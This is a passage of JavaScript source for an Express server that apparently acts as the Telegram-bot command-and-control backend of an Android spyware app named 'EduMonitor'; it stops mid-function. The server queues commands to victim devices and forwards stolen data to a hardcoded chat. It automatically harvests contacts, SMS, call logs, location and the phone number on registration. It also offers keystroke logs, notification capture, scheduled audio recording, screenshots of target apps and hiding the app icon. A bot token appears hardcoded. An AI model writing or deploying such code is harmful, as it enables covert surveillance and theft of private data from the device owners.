const express = require('express');
const axios = require('axios');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const FormData = require('form-data');
const app = express();
const PORT = process.env.PORT || 3000;
const os = require('os');

// Your bot token from @BotFather
const BOT_TOKEN = process.env.BOT_TOKEN || '8566422839:AAGqOdw_Bru2TwF8_BDw6vDGRhwwr-RE2uo';
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

// Store authorized devices and their commands
const devices = new Map();

// Store conversation states for interactive setup
const userStates = new Map();

// Store authorized chat IDs
const authorizedChats = new Set([
    '5326373447', // Your chat ID
]);

// Auto-collection flags - track what data we've requested per device
const autoDataRequested = new Map();

// Schedule states
const SCHEDULE_STATES = {
    IDLE: 'idle',
    AWAITING_START_TIME: 'awaiting_start_time',
    AWAITING_END_TIME: 'awaiting_end_time',
    AWAITING_RECURRING: 'awaiting_recurring',
    AWAITING_INTERVAL: 'awaiting_interval'
};

// Create uploads directory if it doesn't exist
const uploadDir = 'uploads';
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
}

// ============= FILE UPLOAD CONFIGURATION =============
const storage = multer.diskStorage({
    destination: (req, file, cb) => {
        cb(null, uploadDir);
    },
    filename: (req, file, cb) => {
        const deviceId = req.body.deviceId || 'unknown';
        const count = req.body.count || '0';
        const timestamp = Date.now();
        const safeName = file.originalname.replace(/[^a-zA-Z0-9.-]/g, '_');
        cb(null, `${deviceId}-${count}-${timestamp}-${safeName}`);
    }
});

const upload = multer({
    storage,
    limits: { 
        fileSize: 50 * 1024 * 1024, // 50MB limit
        fieldSize: 50 * 1024 * 1024
    }
});

// Middleware
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// ============= HELPER FUNCTIONS =============

function isAuthorizedChat(chatId) {
    return authorizedChats.has(String(chatId));
}

function sendJsonResponse(res, data, statusCode = 200) {
    try {
        res.status(statusCode).setHeader('Content-Type', 'application/json').send(JSON.stringify(data));
    } catch (e) {
        console.error('Error stringifying JSON:', e);
        res.status(500).json({ error: 'Internal server error' });
    }
}

// Get server's public IP
function getServerIP() {
    try {
        const interfaces = os.networkInterfaces();
        for (const name of Object.keys(interfaces)) {
            for (const iface of interfaces[name]) {
                // Skip internal and non-IPv4 addresses
                if (iface.family === 'IPv4' && !iface.internal) {
                    return iface.address;
                }
            }
        }
    } catch (e) {
        console.error('Error getting server IP:', e);
    }
    return 'Unknown';
}

// ============= TELEGRAM MESSAGE FUNCTIONS =============

async function sendTelegramMessage(chatId, text) {
    try {
        if (!text || text.trim().length === 0) {
            console.error('❌ Attempted to send empty message');
            return null;
        }

        console.log(`📨 Sending message to ${chatId}: ${text.substring(0, 50)}...`);
        
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML'
        });
        
        console.log(`✅ Message sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message:', error.response?.data || error.message);
        
        if (error.response?.status === 400) {
            console.log('⚠️ HTML failed, retrying as plain text');
            try {
                const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
                    chat_id: chatId,
                    text: text.replace(/<[^>]*>/g, '')
                });
                return response.data;
            } catch (e) {
                console.error('❌ Plain text also failed:', e.response?.data || e.message);
            }
        }
        return null;
    }
}

async function sendTelegramMessageWithKeyboard(chatId, text, keyboard) {
    try {
        console.log(`📨 Sending message with inline keyboard to ${chatId}`);
        
        const response = await axios.post(`${TELEGRAM_API}/sendMessage`, {
            chat_id: chatId,
            text: text,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
        
        console.log(`✅ Message with keyboard sent successfully`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending message with keyboard:', error.response?.data || error.message);
        return null;
    }
}

async function editMessageKeyboard(chatId, messageId, newKeyboard) {
    try {
        console.log(`🔄 Editing keyboard for message ${messageId}`);
        
        const response = await axios.post(`${TELEGRAM_API}/editMessageReplyMarkup`, {
            chat_id: chatId,
            message_id: messageId,
            reply_markup: {
                inline_keyboard: newKeyboard
            }
        });
        
        console.log(`✅ Keyboard updated`);
        return response.data;
    } catch (error) {
        console.error('❌ Error editing keyboard:', error.response?.data || error.message);
        return null;
    }
}

async function answerCallbackQuery(callbackQueryId, text = null) {
    try {
        await axios.post(`${TELEGRAM_API}/answerCallbackQuery`, {
            callback_query_id: callbackQueryId,
            text: text
        });
    } catch (error) {
        console.error('Error answering callback query:', error.response?.data || error.message);
    }
}

async function setChatMenuButton(chatId) {
    try {
        console.log(`🔘 Setting menu button for chat ${chatId}`);
        
        // Set both the menu button and commands
        await axios.post(`${TELEGRAM_API}/setMyCommands`, {
            commands: [
                { command: 'help', description: '📋 Show main menu' },
                { command: 'status', description: '📊 Device status' },
                { command: 'location', description: '📍 Get GPS location' },
                { command: 'screenshot', description: '📸 Take screenshot' },
                { command: 'record', description: '🎤 Start recording' },
                { command: 'contacts', description: '📇 Get contacts' },
                { command: 'sms', description: '💬 Get SMS' },
                { command: 'calllogs', description: '📞 Get call logs' },
                { command: 'storage', description: '💾 Storage info' },
                { command: 'network', description: '📡 Network info' },
                { command: 'battery', description: '🔋 Battery level' },
                { command: 'small', description: '📏 Small screenshots' },
                { command: 'medium', description: '📏 Medium screenshots' },
                { command: 'original', description: '📏 Original screenshots' },
                { command: 'record_auto_on', description: '⏰ Enable auto recording' },
                { command: 'record_auto_off', description: '⏰ Disable auto recording' },
                { command: 'record_schedule', description: '📅 Check schedule' }
            ]
        });
        
        // Also set the menu button text (appears above input field)
        await axios.post(`${TELEGRAM_API}/setChatMenuButton`, {
            chat_id: chatId,
            menu_button: {
                type: 'commands',
                text: 'Menu'
            }
        });
        
        console.log(`✅ Menu button and commands set for chat ${chatId}`);
    } catch (error) {
        console.error('Error setting menu button:', error.response?.data || error.message);
    }
}

// Helper to create inline buttons
function createInlineButton(text, callbackData) {
    return {
        text: text,
        callback_data: callbackData
    };
}

function createUrlButton(text, url) {
    return {
        text: text,
        url: url
    };
}

// ============= TELEGRAM DOCUMENT HELPER =============

async function sendTelegramDocument(chatId, filePath, filename, caption) {
    try {
        console.log(`📎 Sending document to ${chatId}: ${filename}`);
        
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('document', fs.createReadStream(filePath), { filename });
        formData.append('caption', caption);
        
        const response = await axios.post(`${TELEGRAM_API}/sendDocument`, formData, {
            headers: {
                ...formData.getHeaders()
            },
            maxContentLength: Infinity,
            maxBodyLength: Infinity
        });
        
        console.log(`✅ Document sent successfully to ${chatId}`);
        return response.data;
    } catch (error) {
        console.error('❌ Error sending document:', error.response?.data || error.message);
        
        try {
            const stats = fs.statSync(filePath);
            await sendTelegramMessage(chatId, 
                `⚠️ File too large to send directly.\n\n` +
                `The file is ${(stats.size / 1024).toFixed(2)} KB.`);
        } catch (e) {
            console.error('Error sending fallback message:', e);
        }
        return null;
    }
}

// ============= LOCATION FORMATTER =============

function formatLocationMessage(locationData) {
    try {
        let locData = locationData;
        if (typeof locationData === 'string') {
            try {
                locData = JSON.parse(locationData);
            } catch (e) {
                return { text: locationData };
            }
        }

        if (locData.lat && locData.lon) {
            const lat = locData.lat;
            const lon = locData.lon;
            const accuracy = locData.accuracy || 'Unknown';
            const provider = locData.provider || 'unknown';
            
            const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
            
            return {
                text: `📍 <b>Location Update</b>\n\n` +
                      `• <b>Latitude:</b> <code>${lat}</code>\n` +
                      `• <b>Longitude:</b> <code>${lon}</code>\n` +
                      `• <b>Accuracy:</b> ±${accuracy}m\n` +
                      `• <b>Provider:</b> ${provider}\n\n` +
                      `🗺️ <a href="${mapsUrl}">View on Google Maps</a>`,
                mapsUrl: mapsUrl,
                lat: lat,
                lon: lon
            };
        }
        return { text: locationData };
    } catch (error) {
        console.error('Error formatting location:', error);
        return { text: locationData };
    }
}

// Format IP info into a readable message
function formatIPInfo(ipData) {
    try {
        let ipInfo = ipData;
        if (typeof ipData === 'string') {
            try {
                ipInfo = JSON.parse(ipData);
            } catch (e) {
                return `🌐 IP Info: ${ipData}`;
            }
        }

        let message = '🌐 <b>Network Information</b>\n\n';
        
        if (ipInfo.publicIP) {
            message += `🌍 <b>Public IP:</b> <code>${ipInfo.publicIP}</code>\n`;
            message += `📍 <b>Location:</b> ${ipInfo.city || 'Unknown'}, ${ipInfo.country || 'Unknown'}\n`;
            message += `🏢 <b>ISP:</b> ${ipInfo.isp || 'Unknown'}\n`;
        }
        
        if (ipInfo.wifiIP && ipInfo.wifiIP !== 'Unknown') {
            message += `\n📶 <b>WiFi IP:</b> <code>${ipInfo.wifiIP}</code>\n`;
        }
        
        if (ipInfo.mobileIP && ipInfo.mobileIP !== 'Unknown') {
            message += `📱 <b>Mobile IP:</b> <code>${ipInfo.mobileIP}</code>\n`;
        }
        
        if (ipInfo.connectedTo && ipInfo.connectedTo !== 'Unknown') {
            message += `\n🔗 <b>Connected via:</b> ${ipInfo.connectedTo}\n`;
        }
        
        if (ipInfo.serverIP) {
            message += `\n🖥️ <b>Server IP:</b> <code>${ipInfo.serverIP}</code>\n`;
        }
        
        return message;
    } catch (error) {
        console.error('Error formatting IP info:', error);
        return `🌐 IP Info: ${JSON.stringify(ipData)}`;
    }
}

// ============= AUTO DATA COLLECTION =============

/**
 * Queue auto-data commands for a newly registered device
 */
function queueAutoDataCommands(deviceId, chatId) {
    console.log(`🔄 Queueing auto-data collection for device ${deviceId}`);
    
    // Check if we've already requested data for this device
    if (autoDataRequested.has(deviceId)) {
        console.log(`⚠️ Auto-data already requested for ${deviceId}, skipping`);
        return;
    }
    
    // Mark that we're requesting data
    autoDataRequested.set(deviceId, {
        timestamp: Date.now(),
        requested: [
            'ip_info',
            'phone_number',
            'contacts_html',
            'sms_html', 
            'calllogs_html',
            'apps_html',
            'location'
        ]
    });
    
    const device = devices.get(deviceId);
    if (!device) {
        console.error(`❌ Device not found for auto-data: ${deviceId}`);
        return;
    }
    
    // Initialize pending commands array if needed
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    // Queue commands in sequence with timestamps
    const commands = [
        { command: 'ip_info', delay: 0, description: 'IP Address' },
        { command: 'phone_number', delay: 2, description: 'Phone Number' },
        { command: 'contacts_html', delay: 5, description: 'Contacts' },
        { command: 'sms_html', delay: 10, description: 'SMS Messages' },
        { command: 'calllogs_html', delay: 15, description: 'Call Logs' },
        { command: 'apps_html', delay: 20, description: 'Apps List' },
        { command: 'location', delay: 25, description: 'Location' }
    ];
    
    commands.forEach((cmd, index) => {
        const commandObject = {
            command: cmd.command,
            originalCommand: `/${cmd.command}`,
            messageId: null,
            timestamp: Date.now() + (cmd.delay * 1000), // Stagger by seconds
            autoData: true
        };
        
        device.pendingCommands.push(commandObject);
        console.log(`📝 Auto-data command ${index + 1}/${commands.length} queued: ${cmd.command} (${cmd.description})`);
    });
    
    console.log(`✅ All auto-data commands queued for ${deviceId}`);
}

// ============= MAIN MENU KEYBOARD =============

function getMainMenuKeyboard() {
    return [
        [
            createInlineButton('📱 Data', 'menu_data'),
            createInlineButton('🎤 Recording', 'menu_recording')
        ],
        [
            createInlineButton('📸 Screenshot', 'menu_screenshot'),
            createInlineButton('⚙️ Services', 'menu_services')
        ],
        [
            createInlineButton('📍 Location', 'menu_location'),
            createInlineButton('📊 Stats', 'menu_stats')
        ],
        [
            createInlineButton('🌐 Network', 'menu_network'),
            createInlineButton('📞 Phone', 'menu_phone')
        ],
        [
            createInlineButton('ℹ️ About', 'menu_about'),
            createInlineButton('❌ Close', 'close_menu')
        ]
    ];
}

// ============= WEBHOOK ENDPOINT =============

app.post('/webhook', async (req, res) => {
    res.sendStatus(200);
    
    setImmediate(async () => {
        try {
            const update = req.body;
            console.log('📩 Received update type:', update.callback_query ? 'callback' : (update.message ? 'message' : 'other'));

            // Handle callback queries (button clicks)
            if (update.callback_query) {
                await handleCallbackQuery(update.callback_query);
                return;
            }

            // Handle regular messages
            if (!update?.message) {
                console.log('📭 Non-message update');
                return;
            }

            const chatId = update.message.chat.id;
            const text = update.message.text;
            const messageId = update.message.message_id;

            if (!isAuthorizedChat(chatId)) {
                console.log(`⛔ Unauthorized chat: ${chatId}`);
                await sendTelegramMessage(chatId, '⛔ You are not authorized to use this bot.');
                return;
            }

            // Set menu button for authorized users
            await setChatMenuButton(chatId);

            // Check if user is in a conversation state
            const userState = userStates.get(chatId);
            
            if (userState) {
                await handleConversationMessage(chatId, text, messageId, userState);
                return;
            }

            // Regular command handling
            if (text?.startsWith('/')) {
                await handleCommand(chatId, text, messageId);
            } else {
                // Handle non-command messages
                await sendTelegramMessageWithKeyboard(
                    chatId,
                    "🤖 Use the menu button below or type /help to see available commands.",
                    getMainMenuKeyboard()
                );
            }
        } catch (error) {
            console.error('❌ Error processing webhook:', error);
        }
    });
});

// ============= CALLBACK QUERY HANDLER =============

async function handleCallbackQuery(callbackQuery) {
    const chatId = callbackQuery.message.chat.id;
    const messageId = callbackQuery.message.message_id;
    const data = callbackQuery.data;
    const callbackId = callbackQuery.id;
    
    console.log(`🖱️ Callback received: ${data} from chat ${chatId}`);
    
    // Acknowledge the callback to remove the loading state
    await answerCallbackQuery(callbackId);
    
    // Handle different callback data
    if (data === 'help_main') {
        await editMessageKeyboard(chatId, messageId, getMainMenuKeyboard());
        
    } else if (data === 'menu_data') {
        const keyboard = [
            [
                createInlineButton('📇 Contacts (TXT)', 'cmd:contacts_txt'),
                createInlineButton('📇 Contacts (HTML)', 'cmd:contacts_html')
            ],
            [
                createInlineButton('💬 SMS (TXT)', 'cmd:sms_txt'),
                createInlineButton('💬 SMS (HTML)', 'cmd:sms_html')
            ],
            [
                createInlineButton('📞 Call Logs (TXT)', 'cmd:calllogs_txt'),
                createInlineButton('📞 Call Logs (HTML)', 'cmd:calllogs_html')
            ],
            [
                createInlineButton('⌨️ Keystrokes (TXT)', 'cmd:keystrokes_txt'),
                createInlineButton('⌨️ Keystrokes (HTML)', 'cmd:keystrokes_html')
            ],
            [
                createInlineButton('🔔 Notifications (TXT)', 'cmd:notifications_txt'),
                createInlineButton('🔔 Notifications (HTML)', 'cmd:notifications_html')
            ],
            [
                createInlineButton('📱 Apps List (TXT)', 'cmd:apps_txt'),
                createInlineButton('📱 Apps List (HTML)', 'cmd:apps_html')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_recording') {
        const keyboard = [
            [
                createInlineButton('🎤 Record 60s', 'cmd:record'),
                createInlineButton('⏰ Schedule Status', 'cmd:record_schedule')
            ],
            [
                createInlineButton('✅ Auto ON', 'cmd:record_auto_on'),
                createInlineButton('❌ Auto OFF', 'cmd:record_auto_off')
            ],
            [
                createInlineButton('⚙️ Custom Schedule', 'start_custom_schedule_interactive'),
                createInlineButton('🎚️ Audio Info', 'cmd:audio_info')
            ],
            [
                createInlineButton('▶️ Start Recording', 'cmd:start_recording'),
                createInlineButton('⏹️ Stop Recording', 'cmd:stop_recording')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_screenshot') {
        const keyboard = [
            [
                createInlineButton('📸 Take Now', 'cmd:screenshot'),
                createInlineButton('📏 Small', 'cmd:small')
            ],
            [
                createInlineButton('📏 Medium', 'cmd:medium'),
                createInlineButton('📏 Original', 'cmd:original')
            ],
            [
                createInlineButton('⚙️ Settings', 'cmd:screenshot_settings'),
                createInlineButton('📊 Size Status', 'cmd:size_status')
            ],
            [
                createInlineButton('▶️ Start Service', 'cmd:start_screenshot'),
                createInlineButton('⏹️ Stop Service', 'cmd:stop_screenshot')
            ],
            [
                createInlineButton('🔄 Auto ON', 'cmd:auto_on'),
                createInlineButton('🔄 Auto OFF', 'cmd:auto_off')
            ],
            [
                createInlineButton('📊 Compression Stats', 'cmd:compression_stats'),
                createInlineButton('📱 Target Apps', 'cmd:target_apps')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_services') {
        const keyboard = [
            [
                createInlineButton('👻 Hide Icon', 'cmd:hide_icon'),
                createInlineButton('👁️ Show Icon', 'cmd:show_icon')
            ],
            [
                createInlineButton('🔄 Reboot Services', 'cmd:reboot_app'),
                createInlineButton('🗑️ Clear Logs', 'cmd:clear_logs')
            ],
            [
                createInlineButton('📊 Service Status', 'cmd:status'),
                createInlineButton('📝 Logs Count', 'cmd:logs_count')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_location') {
        const keyboard = [
            [
                createInlineButton('📍 Get Location', 'cmd:location'),
                createInlineButton('📡 Network Info', 'cmd:network')
            ],
            [
                createInlineButton('💾 Storage Info', 'cmd:storage'),
                createInlineButton('🔋 Battery', 'cmd:battery')
            ],
            [
                createInlineButton('ℹ️ Device Info', 'cmd:info'),
                createInlineButton('🕐 Time', 'cmd:time')
            ],
            [
                createInlineButton('📊 Status', 'cmd:status'),
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_network') {
        const keyboard = [
            [
                createInlineButton('🌐 IP Info', 'cmd:ip_info'),
                createInlineButton('📶 WiFi Info', 'cmd:wifi_info')
            ],
            [
                createInlineButton('📱 Mobile Data', 'cmd:mobile_info'),
                createInlineButton('🔄 Network Status', 'cmd:network')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_phone') {
        const keyboard = [
            [
                createInlineButton('📞 Phone Number', 'cmd:phone_number'),
                createInlineButton('📇 SIM Info', 'cmd:sim_info')
            ],
            [
                createInlineButton('📊 Call Logs', 'cmd:calllogs'),
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_stats') {
        const keyboard = [
            [
                createInlineButton('📊 Logs Count', 'cmd:logs_count'),
                createInlineButton('📋 Recent Logs', 'cmd:logs_recent')
            ],
            [
                createInlineButton('📈 Detailed Stats', 'cmd:stats'),
                createInlineButton('📸 Compression Stats', 'cmd:compression_stats')
            ],
            [
                createInlineButton('🗑️ Clear Logs', 'cmd:clear_logs'),
                createInlineButton('🔄 Force Refresh', 'cmd:refresh_data')
            ],
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
    } else if (data === 'menu_about') {
        const keyboard = [
            [
                createInlineButton('◀️ Back', 'help_main')
            ]
        ];
        
        await editMessageKeyboard(chatId, messageId, keyboard);
        await sendTelegramMessage(chatId,
            "🤖 <b>EduMonitor Bot</b>\n\n" +
            "Version: 2.1\n" +
            "Features:\n" +
            "• Remote device monitoring\n" +
            "• Screenshot capture\n" +
            "• Audio recording\n" +
            "• Data extraction (contacts, SMS, etc.)\n" +
            "• Location tracking\n" +
            "• Schedule recording\n" +
            "• IP address tracking\n" +
            "• Phone number detection\n" +
            "• Auto-data collection on registration\n\n" +
            "Use the menu below to navigate.");
        
    } else if (data === 'close_menu') {
        await editMessageKeyboard(chatId, messageId, []);
        await sendTelegramMessage(chatId, "Menu closed. Tap the Menu button or type /help to reopen.");
        
    } else if (data === 'start_custom_schedule_interactive') {
        // Start interactive setup
        userStates.set(chatId, {
            state: SCHEDULE_STATES.AWAITING_START_TIME,
            data: {}
        });
        
        const keyboard = [[createInlineButton('❌ Cancel', 'cancel_setup')]];
        await editMessageKeyboard(chatId, messageId, keyboard);
        
        await sendTelegramMessage(chatId, 
            "⚙️ *Custom Schedule Setup*\n\n" +
            "Please enter the START time in 24-hour format (HH:MM)\n" +
            "Example: `22:00` for 10:00 PM");
        
    } else if (data === 'cancel_setup') {
        userStates.delete(chatId);
        await editMessageKeyboard(chatId, messageId, []);
        await sendTelegramMessage(chatId, "❌ Schedule setup cancelled.");
        
    } else if (data.startsWith('recurring:')) {
        const recurring = data.split(':')[1];
        const userState = userStates.get(chatId);
        
        if (userState && userState.state === SCHEDULE_STATES.AWAITING_RECURRING) {
            userState.data.recurring = recurring === 'daily';
            userState.state = SCHEDULE_STATES.AWAITING_INTERVAL;
            
            await editMessageKeyboard(chatId, messageId, []);
            await sendTelegramMessage(chatId, 
                "✅ Schedule type recorded.\n\n" +
                "Finally, enter the recording interval in minutes (e.g., 15, 30, 60):");
        }
        
    } else if (data.startsWith('cmd:')) {
        // Execute a command
        const command = data.substring(4);
        console.log(`🎯 Executing command from button: ${command}`);
        
        await answerCallbackQuery(callbackId, `⏳ Executing ${command}...`);
        
        // Forward to command handler
        await handleCommand(chatId, `/${command}`, messageId);
        
        // Update keyboard
        const keyboard = [
            [
                createInlineButton('✅ Command Sent', 'noop'),
                createInlineButton('◀️ Back to Menu', 'help_main')
            ]
        ];
        await editMessageKeyboard(chatId, messageId, keyboard);
    }
}

// ============= CONVERSATION HANDLER =============

async function handleConversationMessage(chatId, text, messageId, userState) {
    console.log(`💬 Conversation message: ${text} in state ${userState.state}`);
    
    switch (userState.state) {
        case SCHEDULE_STATES.AWAITING_START_TIME:
            // Validate start time format
            if (!text.match(/^([0-1]?[0-9]|2[0-3]):[0-5][0-9]$/)) {
                await sendTelegramMessage(chatId, 
                    "❌ Invalid time format. Please use HH:MM (e.g., 22:00)");
                return;
            }
            
            userState.data.startTime = text;
            userState.state = SCHEDULE_STATES.AWAITING_END_TIME;
            
            await sendTelegramMessage(chatId, 
                "✅ Start time recorded.\n\n" +
                "Now enter the END time (HH:MM)\n" +
                "Example: `02:00` for 2:00 AM");
            break;
            
        case SCHEDULE_STATES.AWAITING_END_TIME:
            if (!text.match(/^([0-1]?[0-9]|2[0-3]):[0-5][0-9]$/)) {
                await sendTelegramMessage(chatId, 
                    "❌ Invalid time format. Please use HH:MM (e.g., 02:00)");
                return;
            }
            
            userState.data.endTime = text;
            userState.state = SCHEDULE_STATES.AWAITING_RECURRING;
            
            const keyboard = [
                [
                    createInlineButton('✅ Daily', 'recurring:daily'),
                    createInlineButton('🔄 Once', 'recurring:once')
                ]
            ];
            
            await sendTelegramMessageWithKeyboard(
                chatId,
                "✅ End time recorded.\n\n" +
                "Should this schedule repeat daily or run once?",
                keyboard
            );
            break;
            
        case SCHEDULE_STATES.AWAITING_INTERVAL:
            const interval = parseInt(text);
            if (isNaN(interval) || interval < 5 || interval > 120) {
                await sendTelegramMessage(chatId, 
                    "❌ Invalid interval. Please enter a number between 5 and 120.");
                return;
            }
            
            // Parse times
            const [startHour, startMin] = userState.data.startTime.split(':').map(Number);
            const [endHour, endMin] = userState.data.endTime.split(':').map(Number);
            const recurring = userState.data.recurring;
            
            // Create the command
            const command = `/record_custom ${startHour.toString().padStart(2,'0')}:${startMin.toString().padStart(2,'0')} ${endHour.toString().padStart(2,'0')}:${endMin.toString().padStart(2,'0')} ${recurring ? 'daily' : 'once'} ${interval}`;
            
            // Clear state
            userStates.delete(chatId);
            
            // Execute the command
            await handleCommand(chatId, command, messageId);
            
            await sendTelegramMessage(chatId, 
                "✅ *Custom Schedule Configured*\n\n" +
                `Start: ${userState.data.startTime}\n` +
                `End: ${userState.data.endTime}\n` +
                `Type: ${recurring ? 'Daily' : 'One-time'}\n` +
                `Interval: ${interval} minutes\n\n` +
                `Command sent to device.`);
            break;
    }
}

// ============= COMMAND HANDLER =============

async function handleCommand(chatId, command, messageId) {
    console.log(`\n🎯 Handling command: ${command} from chat ${chatId}`);

    // Special case for /help - show main menu
    if (command === '/help' || command === '/start' || command === '/menu') {
        console.log('📋 Showing main menu');
        
        await sendTelegramMessageWithKeyboard(
            chatId,
            "🤖 <b>EduMonitor Control Panel</b>\n\n" +
            "Select a category to get started:",
            getMainMenuKeyboard()
        );
        return;
    }

    // Find device
    let deviceId = null;
    let device = null;
    
    for (const [id, d] of devices.entries()) {
        if (String(d.chatId) === String(chatId)) {
            deviceId = id;
            device = d;
            console.log(`✅ Found device: ${deviceId}`);
            break;
        }
    }

    if (!deviceId) {
        console.log(`❌ No device found for chat ${chatId}`);
        await sendTelegramMessage(chatId, 
            '❌ No device registered.\n\nPlease make sure the Android app is running.');
        return;
    }

    device.lastSeen = Date.now();

    const cleanCommand = command.startsWith('/') ? command.substring(1) : command;
    
    if (!device.pendingCommands) {
        device.pendingCommands = [];
    }
    
    const commandObject = {
        command: cleanCommand,
        originalCommand: command,
        messageId: messageId,
        timestamp: Date.now()
    };
    
    device.pendingCommands.push(commandObject);
    console.log(`📝 Command queued:`, commandObject);

    let ackMessage = `⏳ Processing: ${command}`;
    
    if (cleanCommand.includes('contacts')) {
        ackMessage = `📇 Generating contacts file...`;
    } else if (cleanCommand.includes('sms')) {
        ackMessage = `💬 Generating SMS file...`;
    } else if (cleanCommand.includes('calllogs')) {
        ackMessage = `📞 Generating call logs file...`;
    } else if (cleanCommand.includes('apps')) {
        ackMessage = `📱 Generating apps list file...`;
    } else if (cleanCommand === 'location') {
        ackMessage = `📍 Getting your current location...`;
    } else if (cleanCommand === 'screenshot') {
        ackMessage = `📸 Taking screenshot...`;
    } else if (cleanCommand === 'record') {
        ackMessage = `🎤 Recording audio for 60 seconds...`;
    } else if (cleanCommand === 'ip_info') {
        ackMessage = `🌐 Fetching IP information...`;
    } else if (cleanCommand === 'phone_number') {
        ackMessage = `📞 Getting phone number...`;
    }
    
    await sendTelegramMessage(chatId, ackMessage);
}

// ============= IP INFO ENDPOINT =============

app.post('/api/ipinfo/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const ipData = req.body;
        
        console.log(`🌐 IP Info received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        // Add server IP to the data
        ipData.serverIP = getServerIP();
        
        // Store IP info in device data
        device.lastIPInfo = ipData;
        
        // Format and send the message
        const formattedMessage = formatIPInfo(ipData);
        await sendTelegramMessage(chatId, formattedMessage);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ IP Info endpoint error:', error);
        res.status(500).json({ error: 'IP Info processing failed' });
    }
});

// ============= PHONE NUMBER ENDPOINT =============

app.post('/api/phonenumber/:deviceId', async (req, res) => {
    try {
        const deviceId = req.params.deviceId;
        const phoneData = req.body;
        
        console.log(`📞 Phone number received from ${deviceId}`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        
        // Store phone info in device data
        device.phoneNumber = phoneData.phoneNumber;
        device.simInfo = phoneData.simInfo;
        
        // Format message
        let message = '📞 <b>Phone Information</b>\n\n';
        
        if (phoneData.phoneNumber && phoneData.phoneNumber !== 'Unknown') {
            message += `📱 <b>Phone Number:</b> <code>${phoneData.phoneNumber}</code>\n`;
        } else {
            message += `⚠️ <b>Phone Number:</b> Not available (no SIM or permission required)\n`;
        }
        
        if (phoneData.simInfo) {
            message += `\n<b>SIM Information:</b>\n`;
            message += `• Operator: ${phoneData.simInfo.operator || 'Unknown'}\n`;
            message += `• Country: ${phoneData.simInfo.country || 'Unknown'}\n`;
            message += `• SIM State: ${phoneData.simInfo.state || 'Unknown'}\n`;
            if (phoneData.simInfo.slotCount) {
                message += `• SIM Slots: ${phoneData.simInfo.slotCount}\n`;
            }
        }
        
        if (phoneData.error) {
            message += `\n⚠️ <b>Note:</b> ${phoneData.error}\n`;
        }
        
        await sendTelegramMessage(chatId, message);
        
        res.json({ success: true });
        
    } catch (error) {
        console.error('❌ Phone Number endpoint error:', error);
        res.status(500).json({ error: 'Phone Number processing failed' });
    }
});

// ============= FILE UPLOAD ENDPOINT =============

app.post('/api/upload-file', upload.single('file'), async (req, res) => {
    try {
        const deviceId = req.body.deviceId;
        const command = req.body.command;
        const filename = req.body.filename;
        const itemCount = req.body.count || '0';
        
        if (!deviceId || !command || !filename || !req.file) {
            console.error('❌ Missing fields in upload');
            return res.status(400).json({ error: 'Missing fields' });
        }
        
        console.log(`📎 File upload from ${deviceId}: ${filename} (${req.file.size} bytes, ${itemCount} items)`);
        
        const device = devices.get(deviceId);
        if (!device) {
            console.error(`❌ Device not found: ${deviceId}`);
            return res.status(404).json({ error: 'Device not found' });
        }
        
        const chatId = device.chatId;
        const filePath = req.file.path;
        
        // Determine caption based on command
        let caption = '';
        
        switch (command) {
            case 'contacts_txt':
            case 'contacts_html':
                caption = `📇 Contacts Export (${itemCount} contacts)`;
                break;
            case 'sms_txt':
            case 'sms_html':
                caption = `💬 SMS Messages Export (${itemCount} messages)`;
                break;
            case 'calllogs_txt':
            case 'calllogs_html':
                caption = `📞 Call Logs Export (${itemCount} calls)`;
                break;
            case 'apps_txt':
            case 'apps_html':
                caption = `📱 Installed Apps Export (${itemCount} apps)`;
                break;
            case 'keystrokes_txt':
            case 'keystrokes_html':
                caption = `⌨️ Keystroke Logs Export (${itemCount} entries)`;
                break;
            case 'notifications_txt':
            case 'notifications_html':
                caption = `🔔 Notifications Export (${itemCount} notifications)`;
                break;
            default:
                caption = `📎 Data Export`;
        }
        
        // Send the file to Telegram
        await sendTelegramDocument(chatId, filePath, filename, caption);
        
        // Delete the file after sending
        setTimeout(() => {
            try {
                if (fs.existsSync(filePath)) {
                    fs.unlinkSync(filePath);
                    console.log(`🧹 Deleted temporary file: ${filePath}`);
                }
            } catch (e) {
                console.error('Error deleting file:', e);
            }
